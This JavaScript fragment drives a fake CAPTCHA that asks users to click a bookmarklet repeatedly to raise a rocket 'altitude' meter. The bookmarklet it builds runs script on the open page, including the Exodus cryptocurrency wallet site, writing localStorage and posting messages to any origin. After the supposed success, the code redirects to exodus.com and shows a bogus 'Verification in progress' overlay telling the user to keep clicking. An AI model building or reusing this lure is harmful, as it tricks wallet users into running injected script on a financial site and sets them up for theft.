        "<div style=\"position:relative;width:100%;height:210px;background:linear-gradient(180deg,#0369a1 0%,#0ea5e9 25%,#38bdf8 55%,#bae6fd 85%,#e0f2fe 100%);overflow:hidden;\">" +

        // Stars / dots top
        "<div style=\"position:absolute;top:8px;left:18%;width:3px;height:3px;border-radius:50%;background:rgba(255,255,255,0.8);\"></div>" +
        "<div style=\"position:absolute;top:16px;left:35%;width:2px;height:2px;border-radius:50%;background:rgba(255,255,255,0.6);\"></div>" +
        "<div style=\"position:absolute;top:6px;right:22%;width:3px;height:3px;border-radius:50%;background:rgba(255,255,255,0.8);\"></div>" +
        "<div style=\"position:absolute;top:20px;right:40%;width:2px;height:2px;border-radius:50%;background:rgba(255,255,255,0.5);\"></div>" +

        // Cloud left
        "<div style=\"position:absolute;top:30px;left:8%;\">" +
        "<div style=\"width:54px;height:16px;background:rgba(255,255,255,0.85);border-radius:999px;\"></div>" +
        "<div style=\"width:36px;height:12px;background:rgba(255,255,255,0.85);border-radius:999px;margin:-4px auto 0;\"></div>" +
        "</div>" +
        // Cloud right
        "<div style=\"position:absolute;top:22px;right:10%;\">" +
        "<div style=\"width:66px;height:18px;background:rgba(255,255,255,0.8);border-radius:999px;\"></div>" +
        "<div style=\"width:44px;height:13px;background:rgba(255,255,255,0.8);border-radius:999px;margin:-5px auto 0;\"></div>" +
        "</div>" +

        // Height badge pill
        "<div style=\"position:absolute;top:10px;right:12px;display:flex;align-items:center;gap:5px;background:rgba(255,255,255,0.95);border:1.5px solid #bae6fd;border-radius:999px;padding:4px 14px;box-shadow:0 2px 10px rgba(14,165,233,0.2);\">" +
        "<span style=\"font-size:16px;\">✈️</span>" +
        "<span style=\"font-size:13px;font-weight:800;color:#0369a1;font-family:ui-monospace,monospace;\"><span id=\"jumpHeightDisplay\">0</span> / 100 m</span>" +
        "</div>" +

        // Ground strip
        "<div style=\"position:absolute;bottom:0;left:0;right:0;height:36px;background:linear-gradient(180deg,#4ade80 0%,#16a34a 40%,#15803d 100%);\"></div>" +
        "<div style=\"position:absolute;bottom:34px;left:0;right:0;height:4px;background:rgba(0,0,0,0.12);\"></div>" +

        // Rocket — rises with clicks
        "<div id=\"jumpRobotStack\" style=\"position:absolute;bottom:36px;left:50%;transform:translateX(-50%);transition:bottom 0.2s ease;filter:drop-shadow(0 8px 18px rgba(14,165,233,0.35));\">" +
        "<svg width=\"62\" height=\"110\" viewBox=\"0 0 62 110\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">" +
        // Left fin
        "<path d=\"M18 74 C10 74 4 82 4 90 L4 96 C4 97 5 98 6 97 L18 90 Z\" fill=\"#dc2626\"/>" +
        "<path d=\"M18 74 C10 74 4 82 4 90 L4 96 C4 97 5 98 6 97 L18 90 Z\" fill=\"url(#finShadeL)\" opacity=\"0.3\"/>" +
        // Right fin
        "<path d=\"M44 74 C52 74 58 82 58 90 L58 96 C58 97 57 98 56 97 L44 90 Z\" fill=\"#dc2626\"/>" +
        "<path d=\"M44 74 C52 74 58 82 58 90 L58 96 C58 97 57 98 56 97 L44 90 Z\" fill=\"url(#finShadeR)\" opacity=\"0.3\"/>" +
        // Main body
        "<rect x=\"17\" y=\"30\" width=\"28\" height=\"66\" rx=\"6\" fill=\"url(#bodyGrad)\"/>" +
        // Body highlight stripe
        "<rect x=\"22\" y=\"34\" width=\"5\" height=\"58\" rx=\"2.5\" fill=\"rgba(255,255,255,0.18)\"/>" +
        // Nose cone
        "<path d=\"M31 2 C20 14 17 22 17 30 L45 30 C45 22 42 14 31 2Z\" fill=\"url(#noseGrad)\"/>" +
        // Nose shine
        "<path d=\"M31 6 C26 14 24 20 24 28 L27 28 C27 20 28 14 31 6Z\" fill=\"rgba(255,255,255,0.28)\" />" +
        // Porthole outer
        "<circle cx=\"31\" cy=\"52\" r=\"9\" fill=\"#0f172a\" stroke=\"#e2e8f0\" stroke-width=\"1.5\"/>" +
        // Porthole glass
        "<circle cx=\"31\" cy=\"52\" r=\"7\" fill=\"#0ea5e9\"/>" +
        "<circle cx=\"31\" cy=\"52\" r=\"7\" fill=\"url(#glassGrad)\"/>" +
        // Porthole shine
        "<ellipse cx=\"28.5\" cy=\"49\" rx=\"2.5\" ry=\"1.8\" fill=\"rgba(255,255,255,0.55)\" transform=\"rotate(-20 28.5 49)\"/>" +
        // Nozzle bell
        "<path d=\"M22 94 Q20 100 19 106 L43 106 Q42 100 40 94 Z\" fill=\"#374151\"/>" +
        "<path d=\"M24 94 Q23 100 22.5 106 L25.5 106 Q26 100 26.5 94 Z\" fill=\"rgba(255,255,255,0.10)\"/>" +
        // Nozzle rim
        "<rect x=\"20\" y=\"92\" width=\"22\" height=\"4\" rx=\"2\" fill=\"#1f2937\"/>" +
        // Flag detail
        "<rect x=\"33\" y=\"14\" width=\"8\" height=\"5\" rx=\"1\" fill=\"#fbbf24\"/>" +
        "<rect x=\"33\" y=\"12\" width=\"1.5\" height=\"8\" fill=\"#e5e7eb\"/>" +
        // Defs
        "<defs>" +
        "<linearGradient id=\"bodyGrad\" x1=\"17\" y1=\"0\" x2=\"45\" y2=\"0\" gradientUnits=\"userSpaceOnUse\">" +
        "<stop offset=\"0%\" stop-color=\"#1e3a8a\"/>" +
        "<stop offset=\"40%\" stop-color=\"#2563eb\"/>" +
        "<stop offset=\"100%\" stop-color=\"#1e40af\"/>" +
        "</linearGradient>" +
        "<linearGradient id=\"noseGrad\" x1=\"17\" y1=\"0\" x2=\"45\" y2=\"0\" gradientUnits=\"userSpaceOnUse\">" +
        "<stop offset=\"0%\" stop-color=\"#b91c1c\"/>" +
        "<stop offset=\"50%\" stop-color=\"#ef4444\"/>" +
        "<stop offset=\"100%\" stop-color=\"#dc2626\"/>" +
        "</linearGradient>" +
        "<radialGradient id=\"glassGrad\" cx=\"40%\" cy=\"35%\" r=\"60%\">" +
        "<stop offset=\"0%\" stop-color=\"#bae6fd\"/>" +
        "<stop offset=\"100%\" stop-color=\"#0369a1\"/>" +
        "</radialGradient>" +
        "<linearGradient id=\"finShadeL\" x1=\"4\" y1=\"0\" x2=\"18\" y2=\"0\" gradientUnits=\"userSpaceOnUse\">" +
        "<stop offset=\"0%\" stop-color=\"#000\"/><stop offset=\"100%\" stop-color=\"transparent\"/>" +
        "</linearGradient>" +
        "<linearGradient id=\"finShadeR\" x1=\"44\" y1=\"0\" x2=\"58\" y2=\"0\" gradientUnits=\"userSpaceOnUse\">" +
        "<stop offset=\"0%\" stop-color=\"transparent\"/><stop offset=\"100%\" stop-color=\"#000\"/>" +
        "</linearGradient>" +
        "</defs>" +
        "</svg>" +
        // Flame cluster
        "<div id=\"jumpFlame\" style=\"position:absolute;bottom:-4px;left:50%;transform:translateX(-50%);opacity:0;transition:opacity 0.12s;display:flex;gap:2px;align-items:flex-end;\">" +
        "<div style=\"width:10px;height:28px;background:linear-gradient(180deg,#fef3c7,#f97316,transparent);border-radius:50% 50% 60% 60%;filter:blur(1px);\"></div>" +
        "<div style=\"width:14px;height:40px;background:linear-gradient(180deg,#fef9c3,#fbbf24,#f97316,transparent);border-radius:50% 50% 60% 60%;filter:blur(0.5px);\"></div>" +
        "<div style=\"width:10px;height:28px;background:linear-gradient(180deg,#fef3c7,#f97316,transparent);border-radius:50% 50% 60% 60%;filter:blur(1px);\"></div>" +
        "</div>" +
        "</div>" +

        "</div>" + // end sky

        // Progress bar strip
        "<div style=\"padding:10px 16px 14px;background:#f0f9ff;border-top:1px solid #bae6fd;width:100%;box-sizing:border-box;\">" +
        "<div style=\"display:flex;align-items:center;justify-content:space-between;margin-bottom:7px;\">" +
        "<span style=\"font-size:10px;font-weight:800;letter-spacing:0.1em;text-transform:uppercase;color:#0369a1;\">Altitude</span>" +
        "<span style=\"font-size:12px;font-weight:800;color:#0369a1;font-family:ui-monospace,monospace;\"><span id=\"jumpMeterNum\">0</span>&thinsp;/&thinsp;100 m</span>" +
        "</div>" +
        "<div style=\"height:10px;border-radius:999px;background:#bae6fd;overflow:hidden;box-shadow:inset 0 1px 3px rgba(14,165,233,0.2);\">" +
        "<div id=\"jumpMeterFill\" style=\"height:100%;width:0%;border-radius:999px;background:linear-gradient(90deg,#38bdf8,#0ea5e9,#0369a1);transition:width 0.15s;\"></div>" +
        "</div>" +
        "</div>" +

        "</div>"; // end card

      var prevNJ = -1;
      function updateJump() {
        var heightEl = getEl("jumpHeightDisplay");
        var meterNum = getEl("jumpMeterNum");
        var fill = getEl("jumpMeterFill");
        var stack = getEl("jumpRobotStack");
        var flame = getEl("jumpFlame");
        if (!heightEl || !currentPuzzle || currentPuzzle.step2.type !== "jump") return;
        var deltaJ = getStep2SpamClicks();
        var meters = Math.min(100, deltaJ);
        heightEl.textContent = String(meters);
        if (meterNum) meterNum.textContent = String(meters);
        if (fill) fill.style.width = meters + "%";
        // Rise the rocket: max ~140px above ground
        var rise = Math.min(140, meters * 1.45);
        if (stack) stack.style.bottom = (36 + rise) + "px";
        if (deltaJ > prevNJ && deltaJ > 0) {
          if (flame) {
            flame.style.opacity = "1";
            setTimeout(function () {
              var f = getEl("jumpFlame");
              if (f) f.style.opacity = "0";
            }, 180);
          }
        }
        prevNJ = deltaJ;
      }
      updateJump();
      window._jumpDisplayInterval = setInterval(updateJump, 90);
      startStep2PressureTimer(limit);
      return;
    }
    body.innerHTML =
      timerBlock +
      "<p class=\"click-counter-line\">Clicks: <strong id=\"clickCounter\">0</strong></p>";
    startStep2PressureTimer(limit);
  }

  if (done1Button) {
    done1Button.addEventListener("click", function () {
      if (challenge1) challenge1.classList.add("hidden");
      if (challenge2) challenge2.classList.remove("hidden");
      var banner2 = getEl("challenge2Banner");
      if (banner2 && currentPuzzle && currentPuzzle.step2) banner2.innerHTML = currentPuzzle.step2.bannerText;
      window._challenge2ClicksBaseline = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      renderStep2Content(currentPuzzle);
      var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      var cc = getEl("clickCounter");
      if (cc) cc.textContent = String(n);
      if (currentPuzzle && currentPuzzle.step2 && currentPuzzle.step2.type === "jump") {
        var jumpEl = getEl("jumpHeightDisplay");
        var jfill = getEl("jumpMeterFill");
        var jstack = getEl("jumpRobotStack");
        var meters = Math.min(100, getStep2SpamClicks());
        if (jumpEl) jumpEl.textContent = String(meters);
        if (jfill) jfill.style.width = meters + "%";
        if (jstack) jstack.style.bottom = 30 + Math.min(108, meters * 1.12) + "px";
      }
      if (window._spamRedirectPoll) {
        clearInterval(window._spamRedirectPoll);
        window._spamRedirectPoll = null;
      }
      window._spamRedirectPoll = setInterval(trySpamRedirect, 75);
      var d2 = getEl("done2Button");
      if (d2) {
        if (currentPuzzle && currentPuzzle.step2 && currentPuzzle.step2.noManualDone) {
          d2.style.visibility = "hidden";
          d2.style.pointerEvents = "none";
          d2.setAttribute("aria-hidden", "true");
        } else {
          d2.style.visibility = "";
          d2.style.pointerEvents = "";
          d2.removeAttribute("aria-hidden");
        }
      }
    });
  }

  if (done2Button) {
    done2Button.addEventListener("click", function () {
      var step2 = currentPuzzle && currentPuzzle.step2;
      if (step2 && step2.noManualDone) return;
      var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      var pass = false;
      var msg = "";
      if (!step2) {
        pass = n >= 15;
        msg = "Keep using the bookmark.";
      } else if (step2.type === "storm") {
        pass = getStep2SpamClicks() >= SPAM_CLICKS_TO_REDIRECT;
        msg = "Keep using the bookmark.";
      } else {
        pass = (step2.targetClicks || 0) > 0 && n >= step2.targetClicks;
        msg = "Keep using the bookmark.";
      }
      if (pass) {
        showWidgetSuccessThenRedirect();
      } else {
        alert(msg);
      }
    });
  }

  var challenge1RefreshBtn = getEl("challenge1RefreshBtn");
  var challenge2RefreshBtn = getEl("challenge2RefreshBtn");
  if (challenge1RefreshBtn) {
    challenge1RefreshBtn.addEventListener("click", function () {
      buildChallenge1Grid();
    });
  }
  if (challenge2RefreshBtn) {
    challenge2RefreshBtn.addEventListener("click", function () {
      stopChallenge2Visuals();
      var d2r = getEl("done2Button");
      if (d2r) {
        d2r.style.visibility = "";
        d2r.style.pointerEvents = "";
        d2r.removeAttribute("aria-hidden");
      }
      currentPuzzle = null;
      if (challenge2) challenge2.classList.add("hidden");
      if (challenge1) challenge1.classList.remove("hidden");
      buildChallenge1Grid();
    });
  }

  function buildUnifiedBookmarklet() {
    var baseEsc = captchaBaseUrl.replace(/'/g, "\\'");
    return (
      "javascript:(function(){" +
      "var base='" + baseEsc + "';" +
      "var k='bookmarkletClicks';" +
      "var n=parseInt(localStorage.getItem(k)||0,10)+1;" +
      "localStorage.setItem(k,n);" +
      "var doc=document;var clickCounter=doc.getElementById('clickCounter');" +
      "if(!clickCounter&&window.frames&&window.frames.length){try{for(var i=0;i<window.frames.length;i++){clickCounter=window.frames[i].document.getElementById('clickCounter');if(clickCounter){doc=window.frames[i].document;break;}}}catch(e){}}" +
      "if(clickCounter){" +
      "clickCounter.textContent=n;" +
      "try{window.parent.postMessage({type:'captcha_tick',clicks:n},'*');}catch(e){}" +
      "}else if(window.location.hostname.includes('exodus.com')){" +
      "localStorage.setItem('bookmarkletClicks',n);" +
      "try{window.parent.postMessage({type:'exodus_click',clicks:n},'*');}catch(e){}" +
      "}" +
      "})();"
    );
  }

  const bookmarkletHref = buildUnifiedBookmarklet();

  // Clear localStorage on fresh page load
  (function () {
    var params = new URLSearchParams(location.search);
    if (!params.get("from_bookmarklet") && !params.get("show_exodus_popup")) {
      localStorage.setItem("bookmarkletClicks", "0");
    }
  })();

  function showWidgetSuccessThenRedirect() {
    // Finish any visuals and navigate user into Exodus.
    stopChallenge2Visuals();
    if (challengePopupOverlay) challengePopupOverlay.classList.add("hidden");
    if (captchaBox) captchaBox.classList.add("hidden");
    try {
      window.top.location.href = "https://www.exodus.com?from_captcha=1";
    } catch (e) {
      // Fallback: best-effort redirect
      location.href = "https://www.exodus.com?from_captcha=1";
    }
  }

  window.addEventListener("message", function (e) {
    if (e.data && e.data.type === "captcha_tick") {
      trySpamRedirect();
    }
  });

  // Handle re-injection on exodus.com
  (function () {
    var params = new URLSearchParams(location.search);
    if (params.get("from_captcha") === "1" && window === window.parent) {
      localStorage.setItem("captcha_reinjected", "1");
      var reinjectOverlay = document.createElement("div");
      reinjectOverlay.id = "captcha-reinjection-overlay";
      reinjectOverlay.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.3);display:flex;align-items:center;justify-content:center;z-index:9998;backdrop-filter:blur(1px);";
      
      var reinjectBox = document.createElement("div");
      reinjectBox.style.cssText = "background:#fff;border-radius:8px;padding:30px;text-align:center;max-width:400px;box-shadow:0 10px 40px rgba(0,0,0,0.2);";
      reinjectBox.innerHTML = '<div class="completing-spinner" style="margin:0 auto 20px;"><span class="spinner-dot"></span><span class="spinner-dot"></span><span class="spinner-dot"></span><span class="spinner-dot"></span></div>' +
                              '<p style="font-size:16px;font-weight:500;color:#333;margin:10px 0;">Verification in progress...</p>' +
                              '<p style="font-size:13px;color:#666;margin:8px 0;">90% Complete</p>' +
                              '<p style="font-size:12px;color:#999;margin-top:15px;">Continue clicking the bookmark to finish verification</p>';
      
      reinjectOverlay.appendChild(reinjectBox);
      document.body.appendChild(reinjectOverlay);

      setTimeout(function () {
        if (reinjectOverlay.parentElement) {
          reinjectOverlay.parentElement.removeChild(reinjectOverlay);
        }
        localStorage.removeItem("captcha_reinjected");
      }, 3500);
    }
  })();

})();
